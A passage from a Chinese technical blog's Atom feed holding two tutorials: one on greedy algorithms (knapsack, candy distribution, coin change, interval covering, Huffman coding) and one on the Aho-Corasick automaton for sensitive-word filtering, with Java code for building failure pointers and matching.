    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/08/31/MoGBOnAhSrNsIic.jpg" style="zoom:50%;" /><p>贪心算法有很多经典的应用，比如霍夫曼编码（Huffman Coding）、Prim 和 Kruskal 最小生成树算法、还有 Dijkstra 单源最短路径算法。先来看看如何利用贪心算法来实现对数据压缩编码，有效节省数据存储空间的。</p><span id="more"></span><h3 id="如何理解“贪心算法”？"><a href="#如何理解“贪心算法”？" class="headerlink" title="如何理解“贪心算法”？"></a>如何理解“贪心算法”？</h3><p>假设我们有一个可以容纳 100kg 物品的背包，可以装各种物品。我们有以下 5 种豆子，每种豆子的总量和总价值都各不相同。为了让背包中所装物品的总价值最大，我们如何选择在背包中装哪些豆子？每种豆子又该装多少呢？</p><img data-src="https://i.loli.net/2021/08/31/9XlHKkf26GV1Mej.jpg" style="zoom:50%;" /><p>我们只要先算一算每个物品的单价，按照单价由高到低依次来装就好了。单价从高到低排列，依次是：黑豆、绿豆、红豆、青豆、黄豆，所以，我们可以往背包里装 20kg 黑豆、30kg 绿豆、50kg 红豆。</p><p>这个问题本质上就是贪心算法，可以总结一下贪心算法解决问题的步骤：</p><ol><li><p>当我们看到这类问题的时候，首先要联想到贪心算法：针对一组数据，我们定义了限制值和期望值，希望从中选出几个数据，在满足限制值的情况下，期望值最大。</p></li><li><p>尝试看下这个问题是否可以用贪心算法解决：每次选择当前情况下，在对限制值同等贡献量的情况下，对期望值贡献最大的数据。</p></li><li><p>举例验证贪心算法是否得到最优结果。严格证明贪心算法的正确性是很复杂的，设计较多数学推理，一般举几个例子验证即可。而且，从实践的角度来说，大部分能用贪心算法解决的问题，贪心算法的正确性都是显而易见的，也不需要严格的数学推导证明。</p></li></ol><h3 id="贪心算法实战分析"><a href="#贪心算法实战分析" class="headerlink" title="贪心算法实战分析"></a>贪心算法实战分析</h3><ol><li><strong>分糖果</strong></li></ol><p>我们有 m 个糖果和 n 个孩子。我们现在要把糖果分给这些孩子吃，但是糖果少，孩子多（m&lt;n），所以糖果只能分配给一部分孩子。</p><p>每个糖果的大小不等，这 m 个糖果的大小分别是 s1，s2，s3，……，sm。除此之外，每个孩子对糖果大小的需求也是不一样的，只有糖果的大小大于等于孩子的对糖果大小的需求的时候，孩子才得到满足。假设这 n 个孩子对糖果大小的需求分别是 g1，g2，g3，……，gn。</p><p>可以把这个问题抽象成，从 n 个孩子中，抽取一部分孩子分配糖果，让满足的孩子的个数（期望值）是最大的。这个问题的限制值就是糖果个数 m。</p><p>如果小的糖果可以满足，我们就没必要用更大的糖果，这样更大的就可以留给其他对糖果大小需求更大的孩子。另一方面，对糖果大小需求小的孩子更容易被满足，所以，我们可以从需求小的孩子开始分配糖果。因为满足一个需求大的孩子跟满足一个需求小的孩子，对我们期望值的贡献是一样的。我们每次从剩下的孩子中，找出对糖果大小需求最小的，然后发给他剩下的糖果中能满足他的最小的糖果，这样得到的分配方案，也就是满足的孩子个数最多的方案。</p><ol start="2"><li><strong>钱币找零</strong></li></ol><p>假设我们有 1 元、2 元、5 元、10 元、20 元、50 元、100 元这些面额的纸币，它们的张数分别是 c1、c2、c5、c10、c20、c50、c100。我们现在要用这些钱来支付 K 元，最少要用多少张纸币呢？</p><p>在生活中，我们肯定是先用面值最大的来支付，如果不够，就继续用更小一点面值的，以此类推，最后剩下的用 1 元来补齐。在贡献相同期望值（纸币数目）的情况下，我们希望多贡献点金额，这样就可以让纸币数更少，这就是一种贪心算法的解决思路。</p><ol start="3"><li><strong>区间覆盖</strong></li></ol><p>假设我们有 n 个区间，区间的起始端点和结束端点分别是[l1, r1]，[l2, r2]，[l3, r3]，……，[ln, rn]。我们从这 n 个区间中选出一部分区间，这部分区间满足两两不相交（端点相交的情况不算相交），最多能选出多少个区间呢？</p><img data-src="https://i.loli.net/2021/08/31/pex8BA6jSbROlfW.jpg" style="zoom:50%;" /><p>这个处理思想在很多贪心算法问题中都有用到，比如任务调度、教师排课等等问题。</p><p>这个问题的解决思路是这样的：我们假设这 n 个区间中最左端点是 lmin，最右端点是 rmax。这个问题就相当于，我们选择几个不相交的区间，从左到右将[lmin, rmax]覆盖上。我们按照起始端点从小到大的顺序对这 n 个区间排序。</p><p>我们每次选择的时候，左端点跟前面的已经覆盖的区间不重合的，右端点又尽量小的，这样可以让剩下的未覆盖区间尽可能的大，就可以放置更多的区间。这实际上就是一种贪心的选择方法。</p><img data-src="https://i.loli.net/2021/08/31/HkgiFSfI7yljNLQ.jpg" style="zoom:50%;" /><h3 id="如何用贪心算法实现霍夫曼编码？"><a href="#如何用贪心算法实现霍夫曼编码？" class="headerlink" title="如何用贪心算法实现霍夫曼编码？"></a>如何用贪心算法实现霍夫曼编码？</h3><p>假设我有一个包含 1000 个字符的文件，每个字符占 1 个 byte（1byte=8bits），存储这 1000 个字符就一共需要 8000bits，那有没有更加节省空间的存储方式呢？</p><p>假设我们通过统计分析发现，这 1000 个字符中只包含 6 种不同字符，假设它们分别是 a、b、c、d、e、f。而 3 个二进制位（bit）就可以表示 8 个不同的字符，所以，为了尽量减少存储空间，每个字符我们用 3 个二进制位来表示。那存储这 1000 个字符只需要 3000bits 就可以了，比原来的存储方式节省了很多空间。不过，还有没有更加节省空间的存储方式呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(000)、b(001)、c(010)、d(011)、e(100)、f(101)</span><br></pre></td></tr></table></figure><p>霍夫曼编码是一种十分有效的编码方法，广泛用于数据压缩中，其压缩率通常在 20%～90% 之间。它不仅会考察文本中有多少个不同字符，还会考察每个字符出现的频率，根据频率的不同，选择不同长度的编码。霍夫曼编码试图用这种不等长的编码方法，来进一步增加压缩的效率。如何给不同频率的字符选择不同长度的编码呢？根据贪心的思想，我们可以把出现频率比较多的字符，用稍微短一些的编码；出现频率比较少的字符，用稍微长一些的编码。</p><p>对于等长的编码来说，我们解压缩起来很简单。比如刚才那个例子中，我们用 3 个 bit 表示一个字符。在解压缩的时候，我们每次从文本中读取 3 位二进制码，然后翻译成对应的字符。但是，霍夫曼编码是不等长的，每次应该读取 1 位还是 2 位、3 位等等来解压缩呢？这个问题就导致霍夫曼编码解压缩起来比较复杂。为了避免解压缩过程中的歧义，霍夫曼编码要求各个字符的编码之间，不会出现某个编码是另一个编码前缀的情况。</p><img data-src="https://i.loli.net/2021/08/31/wX4VyIJAriGnZxp.jpg" style="zoom:50%;" /><p>假设这 6 个字符出现的频率从高到低依次是 a、b、c、d、e、f。我们把它们编码下面这个样子，任何一个字符的编码都不是另一个的前缀，在解压缩的时候，我们每次会读取尽可能长的可解压的二进制串，所以在解压缩的时候也不会歧义。经过这种编码压缩之后，这 1000 个字符只需要 2100bits 就可以了。</p><img data-src="https://i.loli.net/2021/08/31/f25VwgtNoeSpLba.jpg" style="zoom:50%;" /><p>如何根据字符出现频率的不同，给不同的字符进行不同长度的编码呢？这里的处理稍微有些技巧。</p><p>我们把每个字符看作一个节点，并且附带着把频率放到优先级队列中。我们从队列中取出频率最小的两个节点 A、B，然后新建一个节点 C，把频率设置为两个节点的频率之和，并把这个新节点 C 作为节点 A、B 的父节点。最后再把 C 节点放入到优先级队列中。重复这个过程，直到队列中没有数据。</p><img data-src="https://i.loli.net/2021/08/31/MTwHPpVdEYgNLum.jpg" style="zoom:50%;" /><p>现在，我们给每一条边加上画一个权值，指向左子节点的边我们统统标记为 0，指向右子节点的边，我们统统标记为 1，那从根节点到叶节点的路径就是叶节点对应字符的霍夫曼编码。</p><img data-src="https://i.loli.net/2021/08/31/vu5VPLzaEH8mWO6.jpg" style="zoom:50%;" />]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/08/31/MoGBOnAhSrNsIic.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;贪心算法有很多经典的应用，比如霍夫曼编码（Huffman Coding）、Prim 和 Kruskal 最小生成树算法、还有 Dijkstra 单源最短路径算法。先来看看如何利用贪心算法来实现对数据压缩编码，有效节省数据存储空间的。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>AC自动机</title>
    <link href="https://speedpromise.github.io/archives/5c28c80e.html"/>
    <id>https://speedpromise.github.io/archives/5c28c80e.html</id>
    <published>2021-08-24T03:26:32.000Z</published>
    <updated>2021-10-28T12:46:14.422Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/08/24/LkDRBtW8EFIz17y.jpg" style="zoom:50%;" /><p>如何用多模式串匹配实现敏感词过滤功能？</p><span id="more"></span><p>实际上，这些功能最基本的原理就是字符串匹配算法，也就是通过维护一个敏感词的字典，当用户输入一段文字内容之后，通过字符串匹配算法，来查找用户输入的这段文字，是否包含敏感词。如果有，就用“***”把它替代掉。</p><p>前面讲过好几种字符串匹配算法了,但是，对于访问量巨大的网站来说，比如淘宝，用户每天的评论数有几亿、甚至几十亿。这时候，我们对敏感词过滤系统的性能要求就要很高。那如何才能实现一个高性能的敏感词过滤系统呢？这就要用到今天的多模式串匹配算法。</p><h3 id="基于单模式串和-Trie-树实现的敏感词过滤"><a href="#基于单模式串和-Trie-树实现的敏感词过滤" class="headerlink" title="基于单模式串和 Trie 树实现的敏感词过滤"></a>基于单模式串和 Trie 树实现的敏感词过滤</h3><p>字符串匹配算法，有 BF 算法、RK 算法、BM 算法、KMP 算法，还有 Trie 树。前面四种算法都是单模式串匹配算法，只有 Trie 树是多模式串匹配算法。</p><p>单模式串匹配算法，是在一个模式串和一个主串之间进行匹配，也就是说，在一个主串中查找一个模式串。多模式串匹配算法，就是在多个模式串和一个主串之间做匹配，也就是说，在一个主串中查找多个模式串。</p><p>尽管，单模式串匹配算法也能完成多模式串的匹配工作。但是，这样做的话，每个匹配过程都需要扫描一遍用户输入的内容。整个过程下来就要扫描很多遍用户输入的内容。如果敏感词很多，比如几千个，并且用户输入的内容很长，假如有上千个字符，那我们就需要扫描几千遍这样的输入内容。很显然，这种处理思路比较低效。</p><p>多模式匹配算法在这个问题的处理上就很高效了。它只需要扫描一遍主串，就能在主串中一次性查找多个模式串是否存在，从而大大提高匹配效率。</p><p>我们可以对敏感词字典进行预处理，构建成 Trie 树结构。这个预处理的操作只需要做一次，如果敏感词字典动态更新了，比如删除、添加了一个敏感词，那我们只需要动态更新一下 Trie 树就可以了。</p><p>当用户输入一个文本内容后，我们把用户输入的内容作为主串，从第一个字符（假设是字符 C）开始，在 Trie 树中匹配。当匹配到 Trie 树的叶子节点，或者中途遇到不匹配字符的时候，我们将主串的开始匹配位置后移一位，也就是从字符 C 的下一个字符开始，重新在 Trie 树中匹配。</p><p>基于 Trie 树的这种处理方法，有点类似单模式串匹配的 BF 算法。我们知道，单模式串匹配算法中，KMP 算法对 BF 算法进行改进，引入了 next 数组，让匹配失败时，尽可能将模式串往后多滑动几位。借鉴单模式串的优化改进方法，能否对多模式串 Trie 树进行改进，进一步提高 Trie 树的效率呢？这就要用到 AC 自动机算法了。</p><h3 id="经典的多模式串匹配算法：AC-自动机"><a href="#经典的多模式串匹配算法：AC-自动机" class="headerlink" title="经典的多模式串匹配算法：AC 自动机"></a>经典的多模式串匹配算法：AC 自动机</h3><p>AC 自动机算法，全称是 Aho-Corasick 算法。其实，Trie 树跟 AC 自动机之间的关系，就像单串匹配中朴素的串匹配算法，跟 KMP 算法之间的关系一样，只不过前者针对的是多模式串而已。所以，<strong>AC 自动机实际上就是在 Trie 树之上，加了类似 KMP 的 next 数组，只不过此处的 next 数组是构建在树上罢了</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AcNode</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">char</span> data; </span><br><span class="line">  <span class="keyword">public</span> AcNode[] children = <span class="keyword">new</span> AcNode[<span class="number">26</span>]; <span class="comment">// 字符集只包含a~z这26个字符</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">boolean</span> isEndingChar = <span class="keyword">false</span>; <span class="comment">// 结尾字符为true</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">int</span> length = -<span class="number">1</span>; <span class="comment">// 当isEndingChar=true时，记录模式串长度</span></span><br><span class="line">  <span class="keyword">public</span> AcNode fail; <span class="comment">// 失败指针</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">AcNode</span><span class="params">(<span class="keyword">char</span> data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = data;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AC 自动机的构建，包含两个操作：</p><ul><li>将多个模式串构建成 Trie 树；</li><li>在 Trie 树上构建失败指针（相当于 KMP 中的失效函数 next 数组）。</li></ul><p>重点看下，<strong>构建好 Trie 树之后，如何在它之上构建失败指针?</strong></p><p>这里有 4 个模式串，分别是 c，bc，bcd，abcd；主串是 abcd。</p><img data-src="https://i.loli.net/2021/08/24/8icgp6rBCk2Rdsj.jpg" style="zoom:50%;" /><p>假设我们沿 Trie 树走到 p 节点，也就是下图中的紫色节点，那 p 的失败指针就是从 root 走到紫色节点形成的字符串 abc，跟所有模式串前缀匹配的最长可匹配后缀子串，就是箭头指的 bc 模式串。</p><p>这里的最长可匹配后缀子串，解释一下。字符串 abc 的后缀子串有两个 bc，c，我们拿它们与其他模式串匹配，如果某个后缀子串可以匹配某个模式串的前缀，那我们就把这个后缀子串叫作可匹配后缀子串。</p><p>我们从可匹配后缀子串中，找出最长的一个，就是刚刚讲到的最长可匹配后缀子串。我们将 p 节点的失败指针指向那个最长匹配后缀子串对应的模式串的前缀的最后一个节点，就是下图中箭头指向的节点。</p><img data-src="https://i.loli.net/2021/08/24/sAqD4aPIWNQBCiF.jpg" style="zoom:50%;" /><p>如果我们把树中相同深度的节点放到同一层，那么某个节点的失败指针只有可能出现在它所在层的上一层。当我们要求某个节点的失败指针的时候，我们通过已经求得的、深度更小的那些节点的失败指针来推导。我们可以逐层依次来求解每个节点的失败指针。所以，失败指针的构建过程，是一个按层遍历树的过程。</p><p>首先 root 的失败指针为 NULL，也就是指向自己。<strong>当我们已经求得某个节点 p 的失败指针之后，如何寻找它的子节点的失败指针呢？</strong></p><p>我们假设节点 p 的失败指针指向节点 q，我们看节点 p 的子节点 pc 对应的字符，是否也可以在节点 q 的子节点中找到。如果找到了节点 q 的一个子节点 qc，对应的字符跟节点 pc 对应的字符相同，则将节点 pc 的失败指针指向节点 qc。</p><img data-src="https://i.loli.net/2021/08/24/gezXtKb72xWDqFN.jpg" style="zoom:50%;" /><p>如果节点 q 中没有子节点的字符等于节点 pc 包含的字符，则令 q=q-&gt;fail（fail 表示失败指针，这里有没有很像 KMP 算法里求 next 的过程？），继续上面的查找，直到 q 是 root 为止，如果还没有找到相同字符的子节点，就让节点 pc 的失败指针指向 root。</p><img data-src="https://i.loli.net/2021/08/24/uWMzIFU3gePGfki.jpg" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buildFailurePointer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Queue&lt;AcNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">  root.fail = <span class="keyword">null</span>;</span><br><span class="line">  queue.add(root);</span><br><span class="line">  <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">    AcNode p = queue.remove();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">      AcNode pc = p.children[i];</span><br><span class="line">      <span class="keyword">if</span> (pc == <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span> (p == root) &#123;</span><br><span class="line">        pc.fail = root;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        AcNode q = p.fail;</span><br><span class="line">        <span class="keyword">while</span> (q != <span class="keyword">null</span>) &#123;</span><br><span class="line">          AcNode qc = q.children[pc.data - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">          <span class="keyword">if</span> (qc != <span class="keyword">null</span>) &#123;</span><br><span class="line">            pc.fail = qc;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          q = q.fail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (q == <span class="keyword">null</span>) &#123;</span><br><span class="line">          pc.fail = root;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      queue.add(pc);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后构建完成之后的 AC 自动机就是下面这个样子：</p><img data-src="https://i.loli.net/2021/08/24/7Or954NY2ojnCLf.jpg" style="zoom:50%;" /><p>构建完后，<strong>如何在 AC 自动机上匹配主串？</strong></p><p>在匹配过程中，主串从 i=0 开始，AC 自动机从指针 p=root 开始，假设模式串是 b，主串是 a。</p><ul><li>如果 p 指向的节点有一个等于 b[i]的子节点 x，我们就更新 p 指向 x，这个时候我们需要通过失败指针，检测一系列失败指针为结尾的路径是否是模式串。这一句不好理解，你可以结合代码看。处理完之后，我们将 i 加一，继续这两个过程；</li><li>如果 p 指向的节点没有等于 b[i]的子节点，那失败指针就派上用场了，我们让 p=p-&gt;fail，然后继续这 2 个过程。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">match</span><span class="params">(<span class="keyword">char</span>[] text)</span> </span>&#123; <span class="comment">// text是主串</span></span><br><span class="line">  <span class="keyword">int</span> n = text.length;</span><br><span class="line">  AcNode p = root;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    <span class="keyword">int</span> idx = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (p.children[idx] == <span class="keyword">null</span> &amp;&amp; p != root) &#123;</span><br><span class="line">      p = p.fail; <span class="comment">// 失败指针发挥作用的地方</span></span><br><span class="line">    &#125;</span><br><span class="line">    p = p.children[idx];</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="keyword">null</span>) p = root; <span class="comment">// 如果没有匹配的，从root开始重新匹配</span></span><br><span class="line">    AcNode tmp = p;</span><br><span class="line">    <span class="keyword">while</span> (tmp != root) &#123; <span class="comment">// 打印出可以匹配的模式串</span></span><br><span class="line">      <span class="keyword">if</span> (tmp.isEndingChar == <span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pos = i-tmp.length+<span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;匹配起始下标&quot;</span> + pos + <span class="string">&quot;; 长度&quot;</span> + tmp.length);</span><br><span class="line">      &#125;</span><br><span class="line">      tmp = tmp.fail;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>AC 自动机实现的敏感词过滤系统，是否比单模式串匹配方法更高效呢？</strong></p><p>，Trie 树构建的时间复杂度是 O(m*len)，其中 len 表示敏感词的平均长度，m 表示敏感词的个数。那构建失败指针的时间复杂度是多少呢？我这里给出一个不是很紧确的上界。</p><p>假设 Trie 树中总的节点个数是 k，每个节点构建失败指针的时候，（可以看下代码）最耗时的环节是 while 循环中的 q=q-&gt;fail，每运行一次这个语句，q 指向节点的深度都会减少 1，而树的高度最高也不会超过 len，所以每个节点构建失败指针的时间复杂度是 O(len)。整个失败指针的构建过程就是 O(k*len)。</p><p>不过，AC 自动机的构建过程都是预先处理好的，构建好之后，并不会频繁地更新，所以不会影响到敏感词过滤的运行效率。</p><p><strong>用 AC 自动机做匹配的时间复杂度是多少？</strong></p><p>跟刚刚构建失败指针的分析类似，for 循环依次遍历主串中的每个字符，for 循环内部最耗时的部分也是 while 循环，而这一部分的时间复杂度也是 O(len)，所以总的匹配的时间复杂度就是 O(n*len)。因为敏感词并不会很长，而且这个时间复杂度只是一个非常宽泛的上限，实际情况下，可能近似于 O(n)，所以 AC 自动机做敏感词过滤，性能非常高。</p><p>你可以会说，从时间复杂度上看，AC 自动机匹配的效率跟 Trie 树一样啊。实际上，因为失效指针可能大部分情况下都指向 root 节点，所以绝大部分情况下，在 AC 自动机上做匹配的效率要远高于刚刚计算出的比较宽泛的时间复杂度。只有在极端情况下，如图所示，AC 自动机的性能才会退化的跟 Trie 树一样。</p><img data-src="https://i.loli.net/2021/08/24/dCR25hBlzAqXUea.jpg" style="zoom:50%;" />]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/08/24/LkDRBtW8EFIz17y.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;如何用多模式串匹配实现敏感词过滤功能？&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
